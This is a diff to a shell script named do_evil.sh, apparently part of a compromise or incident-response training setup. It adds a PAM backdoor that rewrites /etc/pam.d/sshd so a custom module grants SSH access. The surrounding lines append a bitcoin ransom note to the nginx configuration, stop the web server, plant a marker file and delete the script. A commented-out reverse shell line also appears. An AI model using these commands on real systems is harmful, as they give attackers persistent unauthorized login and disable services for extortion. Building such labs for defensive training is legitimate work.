@@ -51,6 +51,13 @@ usermod -a -G wheel ftp
 # start the udp reverse shell (7)
 #/root/.c &
 
+# configure the PAM backdoor (8)
+if [ -s /usr/lib64/security/pam_extra.so ]
+then
+  sed -i '2 s/required/sufficient/' /etc/pam.d/sshd
+  sed -i '2 a auth      sufficient    pam_extra.so' /etc/pam.d/sshd
+fi
+
 # break the web server
 echo "
 ATTENTION
@@ -60,13 +67,13 @@ Your web server has been hacked!
 Please send 1 bitcoin to the address below:
 1MCwBbhNGp5hRm5rC1Aims2YFRe2SXPYKt
 
-You will never be able to stop me! I have at least 7 backdoors in your system.
+You will never be able to stop me! I have too many backdoors in your system.
 
 " >> /etc/nginx/nginx.conf
 
 systemctl stop nginx
 
-touch /tmp/.a_hacker_is_in_your_ram
+touch /home/admin/.a_hacker_is_in_your_ram
 
 # have this script delete itself
 rm /root/do_evil.sh
